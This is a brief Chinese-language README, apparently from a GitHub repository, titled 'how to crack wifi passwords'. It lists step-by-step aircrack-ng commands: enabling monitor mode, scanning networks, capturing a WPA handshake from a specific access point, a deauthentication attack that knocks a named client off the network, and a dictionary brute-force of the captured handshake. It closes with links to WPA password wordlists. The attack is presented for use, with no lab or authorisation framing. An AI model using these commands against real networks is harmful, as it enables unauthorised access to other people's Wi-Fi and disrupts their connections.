# 如何破解wifi密码？

## aircrack-ng 命令的详细解释
![C0127 00_06_19_11 Still004](https://github.com/3981877/wifi/assets/60610978/047fd241-0aed-4df0-86a7-4e8088335950)

sudo -i  ：管理员权限

ifconfig ：查看当前的网卡信息

airmon-ng：检查网卡是否支持监听功能的

airmon-ng start wlan0 ：激活无线网卡的监听模式

airodump-ng wlan0 ：扫描当前周边环境的WiFi信号

## 下面里的部分信息根据自己的情况进行替换

抓包命令：airodump-ng -c 11 –bssid 60:32:B1:56:3F:B2 -w /home/lingdu/桌面/handshake wlan0

ACK 死亡攻击：aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c F0:72:EA:E8:72:21 wlan0

暴力破解命令：
aircrack-ng -w /home/lingdu/桌面/password.txt -b 60:32:B1:56:3F:B2 /home/lingdu/桌面/handshake-0*.cap


## Github上常用的WPA/WPA2 密码字典+加强版
![Uploading The-Demise-of-the-Password.jpg…]()

Github字典下载：https://github.com/conwnet/wpa-dictionary

加强版（来源网络）：https://drive.google.com/file/d/1L1mDFRJAcShwU1gBAbECkx7OR_C7Ef90/view?usp=sharing
